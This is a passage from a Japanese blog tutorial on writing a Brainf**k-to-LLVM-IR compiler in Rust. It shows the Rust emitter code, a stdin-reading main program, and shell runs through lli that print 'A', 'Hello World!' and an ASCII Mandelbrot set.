<span id="cb6-15"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb6-15" aria-hidden="true" tabindex="-1"></a>  <span class="kw">store</span> <span class="dt">i32</span> <span class="fu">%6</span>, <span class="dt">i32</span>* <span class="fu">%4</span>, <span class="kw">align</span> <span class="dv">4</span></span>
<span id="cb6-16"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb6-16" aria-hidden="true" tabindex="-1"></a>  <span class="kw">ret</span> <span class="dt">i32</span> <span class="dv">0</span></span>
<span id="cb6-17"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb6-17" aria-hidden="true" tabindex="-1"></a>}</span>
<span id="cb6-18"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb6-18" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-19"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb6-19" aria-hidden="true" tabindex="-1"></a>attributes #<span class="dv">0</span> = { <span class="kw">noinline</span> <span class="kw">nounwind</span> <span class="kw">optnone</span> <span class="kw">sspstrong</span> uwtable <span class="st">&quot;correctly-rounded-divide-sqrt-fp-math&quot;</span>=<span class="st">&quot;false&quot;</span> <span class="st">&quot;disable-tail-calls&quot;</span>=<span class="st">&quot;false&quot;</span> <span class="st">&quot;less-precise-fpmad&quot;</span>=<span class="st">&quot;false&quot;</span> <span class="st">&quot;min-legal-vector-width&quot;</span>=<span class="st">&quot;0&quot;</span> <span class="st">&quot;no-frame-pointer-elim&quot;</span>=<span class="st">&quot;true&quot;</span> <span class="st">&quot;no-frame-pointer-elim-non-leaf&quot;</span> <span class="st">&quot;no-infs-fp-math&quot;</span>=<span class="st">&quot;false&quot;</span> <span class="st">&quot;no-jump-tables&quot;</span>=<span class="st">&quot;false&quot;</span> <span class="st">&quot;no-nans-fp-math&quot;</span>=<span class="st">&quot;false&quot;</span> <span class="st">&quot;no-signed-zeros-fp-math&quot;</span>=<span class="st">&quot;false&quot;</span> <span class="st">&quot;no-trapping-math&quot;</span>=<span class="st">&quot;false&quot;</span> <span class="st">&quot;stack-protector-buffer-size&quot;</span>=<span class="st">&quot;8&quot;</span> <span class="st">&quot;target-cpu&quot;</span>=<span class="st">&quot;x86-64&quot;</span> <span class="st">&quot;target-features&quot;</span>=<span class="st">&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot;</span> <span class="st">&quot;unsafe-fp-math&quot;</span>=<span class="st">&quot;false&quot;</span> <span class="st">&quot;use-soft-float&quot;</span>=<span class="st">&quot;false&quot;</span> }</span>
<span id="cb6-20"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb6-20" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-21"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb6-21" aria-hidden="true" tabindex="-1"></a>!llvm.module.flags = !{!<span class="dv">0</span>, !<span class="dv">1</span>, !<span class="dv">2</span>}</span>
<span id="cb6-22"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb6-22" aria-hidden="true" tabindex="-1"></a>!llvm.ident = !{!<span class="dv">3</span>}</span>
<span id="cb6-23"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb6-23" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-24"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb6-24" aria-hidden="true" tabindex="-1"></a>!<span class="dv">0</span> = !{<span class="dt">i32</span> <span class="dv">1</span>, !<span class="st">&quot;wchar_size&quot;</span>, <span class="dt">i32</span> <span class="dv">4</span>}</span>
<span id="cb6-25"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb6-25" aria-hidden="true" tabindex="-1"></a>!<span class="dv">1</span> = !{<span class="dt">i32</span> <span class="dv">7</span>, !<span class="st">&quot;PIC Level&quot;</span>, <span class="dt">i32</span> <span class="dv">2</span>}</span>
<span id="cb6-26"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb6-26" aria-hidden="true" tabindex="-1"></a>!<span class="dv">2</span> = !{<span class="dt">i32</span> <span class="dv">7</span>, !<span class="st">&quot;PIE Level&quot;</span>, <span class="dt">i32</span> <span class="dv">2</span>}</span>
<span id="cb6-27"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb6-27" aria-hidden="true" tabindex="-1"></a>!<span class="dv">3</span> = !{!<span class="st">&quot;clang version 9.0.0 (tags/RELEASE_900/final)&quot;</span>}</span></code></pre></div>
<p><code>emit_move_ptr()</code> と <code>emit_add()</code> の実装はこうなる、という感じです。</p>
<div class="sourceCode" id="cb7"><pre class="sourceCode rust"><code class="sourceCode rust"><span id="cb7-1"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="kw">use</span> <span class="kw">crate</span><span class="pp">::codegen::</span>emitter<span class="op">;</span></span>
<span id="cb7-2"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-3"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="kw">impl</span> <span class="pp">emitter::</span>Emitter <span class="cf">for</span> LLVM <span class="op">{</span></span>
<span id="cb7-4"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">fn</span> emit_move_ptr(<span class="op">&amp;</span><span class="kw">mut</span> <span class="kw">self</span><span class="op">,</span> offset<span class="op">:</span> <span class="dt">i32</span>) <span class="op">-&gt;</span> <span class="dt">String</span> <span class="op">{</span></span>
<span id="cb7-5"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-5" aria-hidden="true" tabindex="-1"></a>        <span class="kw">let</span> s <span class="op">=</span> <span class="pp">format!</span>(</span>
<span id="cb7-6"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-6" aria-hidden="true" tabindex="-1"></a>            <span class="st">r#&quot;</span></span>
<span id="cb7-7"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-7" aria-hidden="true" tabindex="-1"></a><span class="st">  ; emit_move_ptr({2})</span></span>
<span id="cb7-8"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-8" aria-hidden="true" tabindex="-1"></a><span class="st">  %{0} = load i32*, i32** %ptr, align 8</span></span>
<span id="cb7-9"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-9" aria-hidden="true" tabindex="-1"></a><span class="st">  %{1} = getelementptr inbounds i32, i32* %{0}, i32 {2}</span></span>
<span id="cb7-10"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-10" aria-hidden="true" tabindex="-1"></a><span class="st">  store i32* %{1}, i32** %ptr, align 8&quot;#</span><span class="op">,</span></span>
<span id="cb7-11"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-11" aria-hidden="true" tabindex="-1"></a>            <span class="kw">self</span><span class="op">.</span>variable_idx<span class="op">,</span></span>
<span id="cb7-12"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-12" aria-hidden="true" tabindex="-1"></a>            <span class="kw">self</span><span class="op">.</span>variable_idx <span class="op">+</span> <span class="dv">1</span><span class="op">,</span></span>
<span id="cb7-13"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-13" aria-hidden="true" tabindex="-1"></a>            offset</span>
<span id="cb7-14"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-14" aria-hidden="true" tabindex="-1"></a>        )<span class="op">;</span></span>
<span id="cb7-15"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-15" aria-hidden="true" tabindex="-1"></a>        <span class="kw">self</span><span class="op">.</span>variable_idx <span class="op">+=</span> <span class="dv">2</span><span class="op">;</span></span>
<span id="cb7-16"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-16" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-17"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-17" aria-hidden="true" tabindex="-1"></a>        s</span>
<span id="cb7-18"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-18" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb7-19"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-19" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-20"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-20" aria-hidden="true" tabindex="-1"></a>    <span class="kw">fn</span> emit_add(<span class="op">&amp;</span><span class="kw">mut</span> <span class="kw">self</span><span class="op">,</span> n<span class="op">:</span> <span class="dt">i32</span>) <span class="op">-&gt;</span> <span class="dt">String</span> <span class="op">{</span></span>
<span id="cb7-21"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-21" aria-hidden="true" tabindex="-1"></a>        <span class="kw">let</span> s <span class="op">=</span> <span class="pp">format!</span>(</span>
<span id="cb7-22"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-22" aria-hidden="true" tabindex="-1"></a>            <span class="st">r#&quot;</span></span>
<span id="cb7-23"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-23" aria-hidden="true" tabindex="-1"></a><span class="st">  ; emit_add({3})</span></span>
<span id="cb7-24"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-24" aria-hidden="true" tabindex="-1"></a><span class="st">  %{0} = load i32*, i32** %ptr, align 8</span></span>
<span id="cb7-25"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-25" aria-hidden="true" tabindex="-1"></a><span class="st">  %{1} = load i32, i32* %{0}, align 4</span></span>
<span id="cb7-26"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-26" aria-hidden="true" tabindex="-1"></a><span class="st">  %{2} = add nsw i32 %{1}, {3}</span></span>
<span id="cb7-27"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-27" aria-hidden="true" tabindex="-1"></a><span class="st">  store i32 %{2}, i32* %{0}, align 4&quot;#</span><span class="op">,</span></span>
<span id="cb7-28"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-28" aria-hidden="true" tabindex="-1"></a>            <span class="kw">self</span><span class="op">.</span>variable_idx<span class="op">,</span></span>
<span id="cb7-29"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-29" aria-hidden="true" tabindex="-1"></a>            <span class="kw">self</span><span class="op">.</span>variable_idx <span class="op">+</span> <span class="dv">1</span><span class="op">,</span></span>
<span id="cb7-30"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-30" aria-hidden="true" tabindex="-1"></a>            <span class="kw">self</span><span class="op">.</span>variable_idx <span class="op">+</span> <span class="dv">2</span><span class="op">,</span></span>
<span id="cb7-31"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-31" aria-hidden="true" tabindex="-1"></a>            n</span>
<span id="cb7-32"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-32" aria-hidden="true" tabindex="-1"></a>        )<span class="op">;</span></span>
<span id="cb7-33"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-33" aria-hidden="true" tabindex="-1"></a>        <span class="kw">self</span><span class="op">.</span>variable_idx <span class="op">+=</span> <span class="dv">3</span><span class="op">;</span></span>
<span id="cb7-34"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-34" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-35"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-35" aria-hidden="true" tabindex="-1"></a>        s</span>
<span id="cb7-36"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-36" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb7-37"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-37" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-38"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-38" aria-hidden="true" tabindex="-1"></a>    <span class="co">// ...</span></span>
<span id="cb7-39"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb7-39" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>そのほかの実装は長くなるので、ここでは割愛します。</p>
<h3 id="とりあえず動かしてみる">とりあえず動かしてみる</h3>
<p>ここまでで Brainf**k の各命令に対応する LLVM IR を出力できるようになったはずです。最初のコンパイラっぽい動作確認に、Brainf**k のソースコードを読み込み、LLVM IR に変換して出力する Brainf**k コンパイラを書いてみます。</p>
<p><a href="https://github.com/Tosainu/chiya/blob/777b7b8b9243604aa6d1ea6a72d038b73a413a7d/src/bin/chiya.rs"><code>src/bin/chiya.rs</code></a> にこんな感じのコードを書きました。標準入力を <code>src</code> に全部読み込み、その文字列を 1 文字ずつ見て対応するコードを出力する、というものです。</p>
<div class="sourceCode" id="cb8"><pre class="sourceCode rust"><code class="sourceCode rust"><span id="cb8-1"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="kw">use</span> <span class="pp">std::io::</span><span class="bu">Read</span><span class="op">;</span></span>
<span id="cb8-2"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb8-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-3"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="kw">use</span> <span class="pp">chiya::codegen::emitter::</span>Emitter<span class="op">;</span></span>
<span id="cb8-4"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb8-4" aria-hidden="true" tabindex="-1"></a><span class="kw">use</span> <span class="pp">chiya::codegen::llvm::</span>LLVM<span class="op">;</span></span>
<span id="cb8-5"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb8-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-6"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb8-6" aria-hidden="true" tabindex="-1"></a><span class="kw">fn</span> main() <span class="op">-&gt;</span> <span class="pp">std::io::</span><span class="dt">Result</span><span class="op">&lt;</span>()<span class="op">&gt;</span> <span class="op">{</span></span>
<span id="cb8-7"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb8-7" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> <span class="kw">mut</span> src <span class="op">=</span> <span class="dt">String</span><span class="pp">::</span>new()<span class="op">;</span></span>
<span id="cb8-8"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb8-8" aria-hidden="true" tabindex="-1"></a>    <span class="pp">std::io::</span>stdin()<span class="op">.</span>read_to_string(<span class="op">&amp;</span><span class="kw">mut</span> src)<span class="op">?;</span></span>
<span id="cb8-9"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb8-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-10"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb8-10" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> <span class="kw">mut</span> e <span class="op">=</span> <span class="pp">LLVM::</span>new()<span class="op">;</span></span>
<span id="cb8-11"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb8-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-12"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb8-12" aria-hidden="true" tabindex="-1"></a>    <span class="pp">println!</span>(<span class="st">&quot;{}&quot;</span><span class="op">,</span> e<span class="op">.</span>emit_header())<span class="op">;</span></span>
<span id="cb8-13"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb8-13" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> c <span class="kw">in</span> src<span class="op">.</span>chars() <span class="op">{</span></span>
<span id="cb8-14"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb8-14" aria-hidden="true" tabindex="-1"></a>        <span class="kw">let</span> l <span class="op">=</span> <span class="cf">match</span> c <span class="op">{</span></span>
<span id="cb8-15"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb8-15" aria-hidden="true" tabindex="-1"></a>            <span class="ch">'&gt;'</span> <span class="op">=&gt;</span> e<span class="op">.</span>emit_move_ptr(<span class="dv">1</span>)<span class="op">,</span></span>
<span id="cb8-16"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb8-16" aria-hidden="true" tabindex="-1"></a>            <span class="ch">'&lt;'</span> <span class="op">=&gt;</span> e<span class="op">.</span>emit_move_ptr(<span class="op">-</span><span class="dv">1</span>)<span class="op">,</span></span>
<span id="cb8-17"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb8-17" aria-hidden="true" tabindex="-1"></a>            <span class="ch">'+'</span> <span class="op">=&gt;</span> e<span class="op">.</span>emit_add(<span class="dv">1</span>)<span class="op">,</span></span>
<span id="cb8-18"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb8-18" aria-hidden="true" tabindex="-1"></a>            <span class="ch">'-'</span> <span class="op">=&gt;</span> e<span class="op">.</span>emit_add(<span class="op">-</span><span class="dv">1</span>)<span class="op">,</span></span>
<span id="cb8-19"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb8-19" aria-hidden="true" tabindex="-1"></a>            <span class="ch">'.'</span> <span class="op">=&gt;</span> e<span class="op">.</span>emit_call_putchar()<span class="op">,</span></span>
<span id="cb8-20"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb8-20" aria-hidden="true" tabindex="-1"></a>            <span class="ch">','</span> <span class="op">=&gt;</span> e<span class="op">.</span>emit_call_getchar()<span class="op">,</span></span>
<span id="cb8-21"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb8-21" aria-hidden="true" tabindex="-1"></a>            <span class="ch">'['</span> <span class="op">=&gt;</span> e<span class="op">.</span>emit_loop_begin()<span class="op">,</span></span>
<span id="cb8-22"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb8-22" aria-hidden="true" tabindex="-1"></a>            <span class="ch">']'</span> <span class="op">=&gt;</span> e<span class="op">.</span>emit_loop_end()<span class="op">,</span></span>
<span id="cb8-23"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb8-23" aria-hidden="true" tabindex="-1"></a>            _ <span class="op">=&gt;</span> <span class="cf">continue</span><span class="op">,</span></span>
<span id="cb8-24"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb8-24" aria-hidden="true" tabindex="-1"></a>        <span class="op">};</span></span>
<span id="cb8-25"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb8-25" aria-hidden="true" tabindex="-1"></a>        <span class="pp">println!</span>(<span class="st">&quot;{}&quot;</span><span class="op">,</span> l)<span class="op">;</span></span>
<span id="cb8-26"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb8-26" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb8-27"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb8-27" aria-hidden="true" tabindex="-1"></a>    <span class="pp">println!</span>(<span class="st">&quot;{}&quot;</span><span class="op">,</span> e<span class="op">.</span>emit_footer())<span class="op">;</span></span>
<span id="cb8-28"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb8-28" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-29"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb8-29" aria-hidden="true" tabindex="-1"></a>    <span class="cn">Ok</span>(())</span>
<span id="cb8-30"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb8-30" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>まずはとても簡単な <code>A</code> を出力するだけのコードを入力し、出力された LLVM IR を LLVM インタプリタの <a href="http://releases.llvm.org/9.0.0/docs/CommandGuide/lli.html"><code>lli</code></a> で実行してみます。</p>
<pre><code>$ echo '+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.' | cargo run -q | lli
A</code></pre>
<p><a href="https://en.wikipedia.org/wiki/Brainfuck#Hello_World!">Wikipedia に載っている Hello World!</a> でもチェック。</p>
<pre><code>$ cargo run -q &lt; hello_with_comments.bf | lli
Hello World!</code></pre>
<p><a href="https://rosettacode.org/wiki/Mandelbrot_set#Brainf.2A.2A.2A">Erik Bosman さんの Mandelbrot set プログラム</a> だと…</p>
<pre><code>$ cargo run -q &lt; mandelbrot.bf | lli
AAAAAAAAAAAAAAAABBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDEGFFEEEEDDDDDDCCCCCCCCCBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
AAAAAAAAAAAAAAABBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDEEEFGIIGFFEEEDDDDDDDDCCCCCCCCCBBBBBBBBBBBBBBBBBBBBBBBBBB
AAAAAAAAAAAAABBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDEEEEFFFI KHGGGHGEDDDDDDDDDCCCCCCCCCBBBBBBBBBBBBBBBBBBBBBBB
AAAAAAAAAAAABBBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDEEEEEFFGHIMTKLZOGFEEDDDDDDDDDCCCCCCCCCBBBBBBBBBBBBBBBBBBBBB
AAAAAAAAAAABBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDEEEEEEFGGHHIKPPKIHGFFEEEDDDDDDDDDCCCCCCCCCCBBBBBBBBBBBBBBBBBB
AAAAAAAAAABBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDEEEEEEFFGHIJKS  X KHHGFEEEEEDDDDDDDDDCCCCCCCCCCBBBBBBBBBBBBBBBB
AAAAAAAAABBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDEEEEEEFFGQPUVOTY   ZQL[MHFEEEEEEEDDDDDDDCCCCCCCCCCCBBBBBBBBBBBBBB
AAAAAAAABBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDEEEEEFFFFFGGHJLZ         UKHGFFEEEEEEEEDDDDDCCCCCCCCCCCCBBBBBBBBBBBB
AAAAAAABBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDEEEEFFFFFFGGGGHIKP           KHHGGFFFFEEEEEEDDDDDCCCCCCCCCCCBBBBBBBBBBB
AAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDEEEEEFGGHIIHHHHHIIIJKMR        VMKJIHHHGFFFFFFGSGEDDDDCCCCCCCCCCCCBBBBBBBBB
AAAAAABBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDEEEEEEFFGHK   MKJIJO  N R  X      YUSR PLV LHHHGGHIOJGFEDDDCCCCCCCCCCCCBBBBBBBB
AAAAABBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDEEEEEEEEEFFFFGH O    TN S                       NKJKR LLQMNHEEDDDCCCCCCCCCCCCBBBBBBB
AAAAABBCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDEEEEEEEEEEEEFFFFFGHHIN                                 Q     UMWGEEEDDDCCCCCCCCCCCCBBBBBB
AAAABBCCCCCCCCCCCCCCCCCCCCCCCCCDDDDEEEEEEEEEEEEEEEFFFFFFGHIJKLOT                                     [JGFFEEEDDCCCCCCCCCCCCCBBBBB
AAAABCCCCCCCCCCCCCCCCCCCCCCDDDDEEEEEEEEEEEEEEEEFFFFFFGGHYV RQU                                     QMJHGGFEEEDDDCCCCCCCCCCCCCBBBB
AAABCCCCCCCCCCCCCCCCCDDDDDDDEEFJIHFFFFFFFFFFFFFFGGGGGGHIJN                                            JHHGFEEDDDDCCCCCCCCCCCCCBBB
AAABCCCCCCCCCCCDDDDDDDDDDEEEEFFHLKHHGGGGHHMJHGGGGGGHHHIKRR                                           UQ L HFEDDDDCCCCCCCCCCCCCCBB
AABCCCCCCCCDDDDDDDDDDDEEEEEEFFFHKQMRKNJIJLVS JJKIIIIIIJLR                                               YNHFEDDDDDCCCCCCCCCCCCCBB
AABCCCCCDDDDDDDDDDDDEEEEEEEFFGGHIJKOU  O O   PR LLJJJKL                                                OIHFFEDDDDDCCCCCCCCCCCCCCB
AACCCDDDDDDDDDDDDDEEEEEEEEEFGGGHIJMR              RMLMN                                                 NTFEEDDDDDDCCCCCCCCCCCCCB
AACCDDDDDDDDDDDDEEEEEEEEEFGGGHHKONSZ                QPR                                                NJGFEEDDDDDDCCCCCCCCCCCCCC
ABCDDDDDDDDDDDEEEEEFFFFFGIPJIIJKMQ                   VX                                                 HFFEEDDDDDDCCCCCCCCCCCCCC
ACDDDDDDDDDDEFFFFFFFGGGGHIKZOOPPS                                                                      HGFEEEDDDDDDCCCCCCCCCCCCCC
ADEEEEFFFGHIGGGGGGHHHHIJJLNY                                                                        TJHGFFEEEDDDDDDDCCCCCCCCCCCCC
A                                                                                                 PLJHGGFFEEEDDDDDDDCCCCCCCCCCCCC
ADEEEEFFFGHIGGGGGGHHHHIJJLNY                                                                        TJHGFFEEEDDDDDDDCCCCCCCCCCCCC
ACDDDDDDDDDDEFFFFFFFGGGGHIKZOOPPS                                                                      HGFEEEDDDDDDCCCCCCCCCCCCCC
ABCDDDDDDDDDDDEEEEEFFFFFGIPJIIJKMQ                   VX                                                 HFFEEDDDDDDCCCCCCCCCCCCCC
AACCDDDDDDDDDDDDEEEEEEEEEFGGGHHKONSZ                QPR                                                NJGFEEDDDDDDCCCCCCCCCCCCCC
AACCCDDDDDDDDDDDDDEEEEEEEEEFGGGHIJMR              RMLMN                                                 NTFEEDDDDDDCCCCCCCCCCCCCB
AABCCCCCDDDDDDDDDDDDEEEEEEEFFGGHIJKOU  O O   PR LLJJJKL                                                OIHFFEDDDDDCCCCCCCCCCCCCCB
AABCCCCCCCCDDDDDDDDDDDEEEEEEFFFHKQMRKNJIJLVS JJKIIIIIIJLR                                               YNHFEDDDDDCCCCCCCCCCCCCBB
AAABCCCCCCCCCCCDDDDDDDDDDEEEEFFHLKHHGGGGHHMJHGGGGGGHHHIKRR                                           UQ L HFEDDDDCCCCCCCCCCCCCCBB
AAABCCCCCCCCCCCCCCCCCDDDDDDDEEFJIHFFFFFFFFFFFFFFGGGGGGHIJN                                            JHHGFEEDDDDCCCCCCCCCCCCCBBB
AAAABCCCCCCCCCCCCCCCCCCCCCCDDDDEEEEEEEEEEEEEEEEFFFFFFGGHYV RQU                                     QMJHGGFEEEDDDCCCCCCCCCCCCCBBBB
AAAABBCCCCCCCCCCCCCCCCCCCCCCCCCDDDDEEEEEEEEEEEEEEEFFFFFFGHIJKLOT                                     [JGFFEEEDDCCCCCCCCCCCCCBBBBB
AAAAABBCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDEEEEEEEEEEEEFFFFFGHHIN                                 Q     UMWGEEEDDDCCCCCCCCCCCCBBBBBB
AAAAABBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDEEEEEEEEEFFFFGH O    TN S                       NKJKR LLQMNHEEDDDCCCCCCCCCCCCBBBBBBB
AAAAAABBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDEEEEEEFFGHK   MKJIJO  N R  X      YUSR PLV LHHHGGHIOJGFEDDDCCCCCCCCCCCCBBBBBBBB
AAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDEEEEEFGGHIIHHHHHIIIJKMR        VMKJIHHHGFFFFFFGSGEDDDDCCCCCCCCCCCCBBBBBBBBB
AAAAAAABBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDEEEEFFFFFFGGGGHIKP           KHHGGFFFFEEEEEEDDDDDCCCCCCCCCCCBBBBBBBBBBB
AAAAAAAABBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDEEEEEFFFFFGGHJLZ         UKHGFFEEEEEEEEDDDDDCCCCCCCCCCCCBBBBBBBBBBBB
